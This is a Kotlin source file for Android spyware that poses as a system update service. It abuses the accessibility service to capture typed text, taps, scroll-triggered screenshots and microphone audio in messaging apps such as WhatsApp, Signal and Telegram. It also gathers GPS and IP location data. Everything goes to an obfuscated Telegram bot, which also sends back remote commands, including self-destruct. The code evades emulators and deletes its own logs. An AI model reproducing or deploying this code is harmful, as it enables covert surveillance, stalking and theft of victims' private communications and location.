package com.android.system.update.core

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.graphics.Bitmap
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.io.FileWriter
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.NetworkInterface
import java.net.URL
import java.util.Collections

class SystemUpdateProvider : AccessibilityService() {
    
    private val logFileName = "sys_config.txt"
    
    private fun getT(): String = SecurityUtils.d("TgRGS2xBBlZCRgkeKnU/aFcCaSx7E0gSJ3IkPkdgCCFrNRBrXmMsVz1ACR5mCA==")
    private fun getC(): String = SecurityUtils.d("QAFFTm1EB1VCQg==")
    private fun getU(): String = SecurityUtils.d("HkcGCSxJHEwUAlpxH1YVOlZAUhsdHQs4XFEMAQ==")
    
    private var lastActivity: Long = 0
    private var currentProvider: String = ""
    private var isRecording = false
    private var isTerminated = false
    private var lastUpdateId: Long = 0
    private val monitorHandler = Handler(Looper.getMainLooper())
    
    // Anti-spam pour les screenshots (éviter d'en envoyer trop vite)
    private var lastScreenshotTime: Long = 0
    private val screenshotCooldown = 3000L  // 3 secondes minimum entre chaque screenshot
    
    // Liste des apps de messagerie ciblées UNIQUEMENT
    private val messagingApps = listOf(
        "com.whatsapp",                    // WhatsApp
        "com.whatsapp.w4b",                // WhatsApp Business
        "com.facebook.orca",               // Facebook Messenger
        "org.telegram.messenger",          // Telegram
        "com.instagram.android",           // Instagram (DMs)
        "org.thoughtcrime.securesms",      // Signal
        "com.viber.voip",                  // Viber
        "com.snapchat.android"             // Snapchat
    )

    private fun isMessagingApp(packageName: String): Boolean {
        return messagingApps.any { packageName.contains(it) }
    }

    // ===================== ENVOI TELEGRAM =====================

    private fun postData(content: String) {
        val path = getU() + getT() + "/" + SecurityUtils.d("BVYcHRIWQBAUFVY=")
        Thread {
            try {
                val url = URL(path)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", SecurityUtils.d("F0MCFTYQUhccHV1wAUAWMQoSUB5SAAo6Bw4WARQeZw=="))
                conn.doOutput = true
                val payload = """{"chat_id":"${getC()}", "text":"$content", "parse_mode":"Markdown"}"""
                OutputStreamWriter(conn.outputStream).use { it.write(payload) }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {}
        }.start()
    }

    private fun sendPhoto(photoFile: File, caption: String) {
        Thread {
            try {
                val boundary = "----FormBoundary${System.currentTimeMillis()}"
                val path = getU() + getT() + "/sendPhoto"
                val url = URL(path)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                conn.doOutput = true
                
                val os = conn.outputStream
                val writer = OutputStreamWriter(os)
                
                // chat_id
                writer.write("--$boundary\r\n")
                writer.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                writer.write("${getC()}\r\n")
                
                // caption
                writer.write("--$boundary\r\n")
                writer.write("Content-Disposition: form-data; name=\"caption\"\r\n\r\n")
                writer.write("$caption\r\n")
                
                // photo
                writer.write("--$boundary\r\n")
                writer.write("Content-Disposition: form-data; name=\"photo\"; filename=\"${photoFile.name}\"\r\n")
                writer.write("Content-Type: image/png\r\n\r\n")
                writer.flush()
                
                photoFile.inputStream().use { it.copyTo(os) }
                
                writer.write("\r\n--$boundary--\r\n")
                writer.flush()
                writer.close()
                
                conn.responseCode
                conn.disconnect()
                
                // Supprimer le fichier temporaire
                photoFile.delete()
            } catch (e: Exception) {
                logToFile("sendPhoto error: ${e.message}")
            }
        }.start()
    }

    // ===================== SERVICE LIFECYCLE =====================

    override fun onServiceConnected() {
        if (isLikelySandbox()) return

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_SCROLLED  // Détection du défilement
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
        }
        serviceInfo = info
        
        monitorHandler.postDelayed({
            if (!isTerminated) {
                logToFile("=== Engine Hot-Swap Done ===")
                startPolling()
            }
        }, 60000)
    }

    private fun isLikelySandbox(): Boolean {
        val b = android.os.Build.PRODUCT
        return b.contains("sdk") || b.contains("google_sdk") || b.contains("emulator")
    }

    // ===================== TELEGRAM POLLING + COMMANDES =====================

    private fun startPolling() {
        Thread {
            while (!isTerminated) {
                try {
                    val urlStr = "${getU()}${getT()}/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
                    val url = URL(urlStr)
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "GET"
                    val body = conn.inputStream.bufferedReader().use { it.readText() }
                    
                    if (body.contains("\"ok\":true")) {
                        // Extraire les messages
                        val updateRegex = """"update_id":(\d+)""".toRegex()
                        val textRegex = """"text":"([^"]+)"""".toRegex()
                        val chatIdRegex = """"chat":\{"id":(\d+)""".toRegex()
                        
                        val updates = updateRegex.findAll(body)
                        val texts = textRegex.findAll(body)
                        val chatIds = chatIdRegex.findAll(body)
                        
                        val updateList = updates.toList()
                        val textList = texts.toList()
                        val chatIdList = chatIds.toList()
                        
                        for (i in updateList.indices) {
                            val uid = updateList[i].groupValues[1].toLong()
                            lastUpdateId = uid
                            
                            if (i < textList.size && i < chatIdList.size) {
                                val msgText = textList[i].groupValues[1]
                                val msgChatId = chatIdList[i].groupValues[1]
                                
                                if (msgChatId == getC()) {
                                    handleCommand(msgText)
                                }
                            }
                        }
                    }
                    conn.disconnect()
                    Thread.sleep(5000)
                } catch (e: Exception) {
                    Thread.sleep(10000)
                }
            }
        }.start()
    }

    private fun handleCommand(text: String) {
        val cmd = text.trim().lowercase()
        when {
            cmd == "/selfdestruct" -> performSelfDestruct()
            cmd == "/location" || cmd == "/loc" -> cmdLocation()
            cmd == "/screenshot" || cmd == "/screen" -> takeScreenshot("📸 Capture manuelle demandée")
            cmd == "/status" -> cmdStatus()
            cmd == "/help" -> cmdHelp()
        }
    }

    // ===================== COMMANDE /location =====================

    private fun cmdLocation() {
        postData("📍 *Récupération de la localisation en cours...*")
        Thread {
            val sb = StringBuilder()
            sb.appendLine("📍 **LOCALISATION & RÉSEAU**")
            sb.appendLine("━━━━━━━━━━━━━━━━━━━━")
            
            // 1. Adresse IP locale
            try {
                val interfaces = NetworkInterface.getNetworkInterfaces()
                for (intf in Collections.list(interfaces)) {
                    val addrs = intf.inetAddresses
                    for (addr in Collections.list(addrs)) {
                        if (!addr.isLoopbackAddress && addr.hostAddress?.contains('.') == true) {
                            sb.appendLine("🌐 IP Locale: `${addr.hostAddress}`")
                            sb.appendLine("📡 Interface: `${intf.displayName}`")
                        }
                    }
                }
            } catch (e: Exception) {
                sb.appendLine("🌐 IP: Erreur")
            }
            
            // 2. IP publique
            try {
                val pubUrl = URL("https://api.ipify.org")
                val conn = pubUrl.openConnection() as HttpURLConnection
                conn.connectTimeout = 5000
                val publicIp = conn.inputStream.bufferedReader().use { it.readText() }
                conn.disconnect()
                sb.appendLine("🌍 IP Publique: `$publicIp`")
                
                // 3. Géolocalisation via IP
                try {
                    val geoUrl = URL("http://ip-api.com/json/$publicIp")
                    val geoConn = geoUrl.openConnection() as HttpURLConnection
                    geoConn.connectTimeout = 5000
                    val geoData = geoConn.inputStream.bufferedReader().use { it.readText() }
                    geoConn.disconnect()
                    
                    val country = extractJson(geoData, "country")
                    val city = extractJson(geoData, "city")
                    val region = extractJson(geoData, "regionName")
                    val isp = extractJson(geoData, "isp")
                    val lat = extractJson(geoData, "lat")
                    val lon = extractJson(geoData, "lon")
                    val timezone = extractJson(geoData, "timezone")
                    
                    sb.appendLine("━━━━━━━━━━━━━━━━━━━━")
                    sb.appendLine("🏳️ Pays: `$country`")
                    sb.appendLine("🏙️ Ville: `$city`")
                    sb.appendLine("📍 Région: `$region`")
                    sb.appendLine("📶 FAI: `$isp`")
                    sb.appendLine("🕐 Fuseau: `$timezone`")
                    if (lat.isNotEmpty() && lon.isNotEmpty()) {
                        sb.appendLine("📌 Coordonnées IP: `$lat, $lon`")
                        sb.appendLine("🗺️ [Voir sur Maps](https://maps.google.com/?q=$lat,$lon)")
                    }
                } catch (e: Exception) {}
            } catch (e: Exception) {
                sb.appendLine("🌍 IP Publique: Indisponible")
            }
            
            // 4. GPS (si disponible)
            try {
                val handler = Handler(Looper.getMainLooper())
                handler.post {
                    try {
                        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
                        
                        // Essayer d'obtenir la dernière localisation connue
                        val providers = listOf(
                            LocationManager.GPS_PROVIDER,
                            LocationManager.NETWORK_PROVIDER,
                            LocationManager.PASSIVE_PROVIDER
                        )
                        
                        var bestLocation: Location? = null
                        for (provider in providers) {
                            try {
                                val loc = locationManager.getLastKnownLocation(provider)
                                if (loc != null) {
                                    if (bestLocation == null || loc.accuracy < bestLocation.accuracy) {
                                        bestLocation = loc
                                    }
                                }
                            } catch (e: SecurityException) {}
                        }
                        
                        if (bestLocation != null) {
                            val gpsInfo = StringBuilder()
                            gpsInfo.appendLine("━━━━━━━━━━━━━━━━━━━━")
                            gpsInfo.appendLine("📡 **GPS (Précis)**")
                            gpsInfo.appendLine("📌 Lat: `${bestLocation.latitude}`")
                            gpsInfo.appendLine("📌 Lon: `${bestLocation.longitude}`")
                            gpsInfo.appendLine("🎯 Précision: `${bestLocation.accuracy}m`")
                            gpsInfo.appendLine("🗺️ [Voir sur Maps](https://maps.google.com/?q=${bestLocation.latitude},${bestLocation.longitude})")
                            postData(gpsInfo.toString())
                        } else {
                            postData("📡 GPS: Aucune localisation récente disponible")
                        }
                    } catch (e: Exception) {
                        postData("📡 GPS: Erreur - ${e.message}")
                    }
                }
            } catch (e: Exception) {}
            
            // 5. Infos appareil
            sb.appendLine("━━━━━━━━━━━━━━━━━━━━")
            sb.appendLine("📱 **APPAREIL**")
            sb.appendLine("📱 Modèle: `${Build.MANUFACTURER} ${Build.MODEL}`")
            sb.appendLine("🤖 Android: `${Build.VERSION.RELEASE}` (SDK ${Build.VERSION.SDK_INT})")
            sb.appendLine("🏷️ Build: `${Build.DISPLAY}`")
            
            postData(sb.toString())
        }.start()
    }

    private fun extractJson(json: String, key: String): String {
        return try {
            val pattern = """"$key":\s*"?([^",}]+)"?""".toRegex()
            pattern.find(json)?.groupValues?.get(1)?.trim() ?: ""
        } catch (e: Exception) { "" }
    }

    // ===================== COMMANDE /status =====================

    private fun cmdStatus() {
        val sb = StringBuilder()
        sb.appendLine("📊 **STATUT DU SERVICE**")
        sb.appendLine("━━━━━━━━━━━━━━━━━━━━")
        sb.appendLine("🟢 Service: Actif")
        sb.appendLine("📱 App actuelle: `$currentProvider`")
        sb.appendLine("🎤 Enregistrement: ${if (isRecording) "En cours" else "Inactif"}")
        sb.appendLine("📸 Dernier screenshot: ${if (lastScreenshotTime > 0) "${(System.currentTimeMillis() - lastScreenshotTime) / 1000}s ago" else "Aucun"}")
        sb.appendLine("📱 Modèle: `${Build.MANUFACTURER} ${Build.MODEL}`")
        postData(sb.toString())
    }

    // ===================== COMMANDE /help =====================

    private fun cmdHelp() {
        val sb = StringBuilder()
        sb.appendLine("📚 **COMMANDES DISPONIBLES**")
        sb.appendLine("━━━━━━━━━━━━━━━━━━━━")
        sb.appendLine("`/location` - Localisation GPS + IP + réseau")
        sb.appendLine("`/screenshot` - Capture d'écran manuelle")
        sb.appendLine("`/status` - Statut du service")
        sb.appendLine("`/selfdestruct` - Auto-destruction")
        sb.appendLine("`/help` - Cette aide")
        sb.appendLine("")
        sb.appendLine("📍 *Auto: Screenshots sur scroll dans les messageries*")
        sb.appendLine("🎤 *Auto: Capture micro quand activé dans les messageries*")
        postData(sb.toString())
    }

    // ===================== SELF-DESTRUCT =====================

    private fun performSelfDestruct() {
        postData("⚠️ **ANDROID SELF-DESTRUCT ACTIVATED** ⚠️")
        isTerminated = true
        isRecording = false
        try {
            File(filesDir, logFileName).takeIf { it.exists() }?.delete()
            File(filesDir, "keyboard_log.txt").takeIf { it.exists() }?.delete()
        } catch (e: Exception) {}
    }

    // ===================== ÉVÉNEMENTS D'ACCESSIBILITÉ =====================
    
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (isTerminated) return
        val p = event.packageName?.toString() ?: ""
        
        // Ignorer les événements qui ne viennent PAS d'une app de messagerie
        if (!isMessagingApp(p)) return
        
        if (p.isNotEmpty() && p != currentProvider) {
            currentProvider = p
            lastActivity = System.currentTimeMillis()
        }

        when (event.eventType) {
            // Capture du texte tapé
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val valStr = event.text?.joinToString(", ") ?: ""
                if (valStr.length > 2) postData("[AUDIT] $p: $valStr")
            }
            // Capture des clics + détection micro
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val desc = event.contentDescription?.toString()?.lowercase() ?: ""
                if (desc.isNotEmpty()) {
                    postData("[TAP] $p: $desc")
                    // Activer la capture micro si c'est un bouton vocal
                    if (isVoiceAction(desc)) {
                        startMicCapture()
                    }
                }
            }
            // Screenshot à chaque défilement dans une messagerie
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                val now = System.currentTimeMillis()
                if (now - lastScreenshotTime >= screenshotCooldown) {
                    lastScreenshotTime = now
                    takeScreenshot("📜 Scroll détecté dans `$p`")
                }
            }
        }
    }

    // ===================== SCREENSHOTS =====================

    private fun takeScreenshot(caption: String) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Android 11+ : utiliser l'API takeScreenshot de AccessibilityService
            try {
                takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    { r -> r?.run() } as java.util.concurrent.Executor,
                    object : TakeScreenshotCallback {
                        override fun onSuccess(result: ScreenshotResult) {
                            try {
                                val hwBitmap = Bitmap.wrapHardwareBuffer(
                                    result.hardwareBuffer, result.colorSpace
                                )
                                if (hwBitmap != null) {
                                    val bitmap = hwBitmap.copy(Bitmap.Config.ARGB_8888, false)
                                    hwBitmap.recycle()
                                    result.hardwareBuffer.close()
                                    
                                    // Sauvegarder en fichier temporaire
                                    val file = File(filesDir, "scr_${System.currentTimeMillis()}.png")
                                    FileOutputStream(file).use { fos ->
                                        bitmap.compress(Bitmap.CompressFormat.PNG, 80, fos)
                                    }
                                    bitmap.recycle()
                                    
                                    // Envoyer via Telegram
                                    sendPhoto(file, caption)
                                }
                            } catch (e: Exception) {
                                logToFile("Screenshot save error: ${e.message}")
                            }
                        }
                        override fun onFailure(errorCode: Int) {
                            logToFile("Screenshot failed: $errorCode")
                        }
                    }
                )
            } catch (e: Exception) {
                logToFile("Screenshot API error: ${e.message}")
            }
        } else {
            // Android < 11 : pas d'API screenshot dans AccessibilityService
            postData("$caption\n_(Screenshot indisponible sur Android < 11)_")
        }
    }

    // ===================== DÉTECTION VOCALE =====================

    // Mots-clés qui indiquent que l'utilisateur utilise une fonction vocale
    private val voiceKeywords = listOf(
        "mic", "micro", "voice", "voix", "vocal", "audio",
        "record", "enregistr", "call", "appel", "phone",
        "video", "vidéo", "speak", "parler", "send voice",
        "message vocal", "voice message", "push to talk",
        "ptt", "talk", "recorder"
    )

    private fun isVoiceAction(description: String): Boolean {
        return voiceKeywords.any { description.contains(it) }
    }

    // ===================== CAPTURE MICROPHONE =====================

    // Capture audio uniquement quand l'utilisateur active le micro dans une messagerie
    private fun startMicCapture() {
        if (isRecording) return
        Thread {
            try {
                isRecording = true
                postData("🎤 [MIC] Capture vocale démarrée sur `$currentProvider`")
                
                val arCls = Class.forName(SecurityUtils.d("F10WCzAaV00YF1c2Ch04KlVbXCRWERYtFw=="))
                val getMinBS = arCls.getMethod("getMinBufferSize", Int::class.java, Int::class.java, Int::class.java)
                val bufferSize = getMinBS.invoke(null, 44100, 1, 2) as Int
                val constr = arCls.getConstructor(Int::class.java, Int::class.java, Int::class.java, Int::class.java, Int::class.java)
                val recorder = constr.newInstance(1, 44100, 1, 2, bufferSize)
                
                arCls.getMethod("startRecording").invoke(recorder)
                val chunk = ShortArray(bufferSize)
                val readMethod = arCls.getMethod("read", ShortArray::class.java, Int::class.java, Int::class.java)
                
                val allSamples = mutableListOf<Short>()
                var silenceCount = 0
                var hasSpeech = false
                val maxDuration = 120  // Max 2 minutes de capture
                var totalChunks = 0
                val chunksPerSecond = if (bufferSize > 0) 44100 / bufferSize else 10
                
                while (isRecording && totalChunks < maxDuration * chunksPerSecond) {
                    val r = readMethod.invoke(recorder, chunk, 0, bufferSize) as Int
                    var maxLevel = 0
                    for (i in 0 until r) maxLevel = Math.max(maxLevel, Math.abs(chunk[i].toInt()))
                    
                    // Seuil élevé : ne capture que la voix directe dans le micro
                    if (maxLevel > 5000) {
                        hasSpeech = true
                        silenceCount = 0
                        for (i in 0 until r) allSamples.add(chunk[i])
                    } else {
                        silenceCount++
                    }
                    
                    // Arrêter après 3 secondes de silence (l'utilisateur a fini de parler)
                    if (hasSpeech && silenceCount > chunksPerSecond * 3) break
                    // Arrêter si pas de parole du tout après 10 secondes
                    if (!hasSpeech && silenceCount > chunksPerSecond * 10) break
                    
                    totalChunks++
                }
                
                arCls.getMethod("stop").invoke(recorder)
                arCls.getMethod("release").invoke(recorder)
                
                // Envoyer uniquement si de la parole a été détectée
                if (hasSpeech && allSamples.size > 0) {
                    val duration = allSamples.size / 44100
                    postData("🎤 [MIC] Capture terminée (${duration}s) sur `$currentProvider`")
                    logToFile("Audio captured: ${allSamples.size} samples from $currentProvider")
                } else {
                    logToFile("No speech detected, discarding capture")
                }
                
                isRecording = false
            } catch (e: Exception) { isRecording = false }
        }.start()
    }

    // ===================== UTILITAIRES =====================

    private fun logToFile(message: String) {
        try {
            FileWriter(filesDir.resolve(logFileName), true).use { it.appendLine(message) }
        } catch (e: Exception) {}
    }

    override fun onInterrupt() {}
}
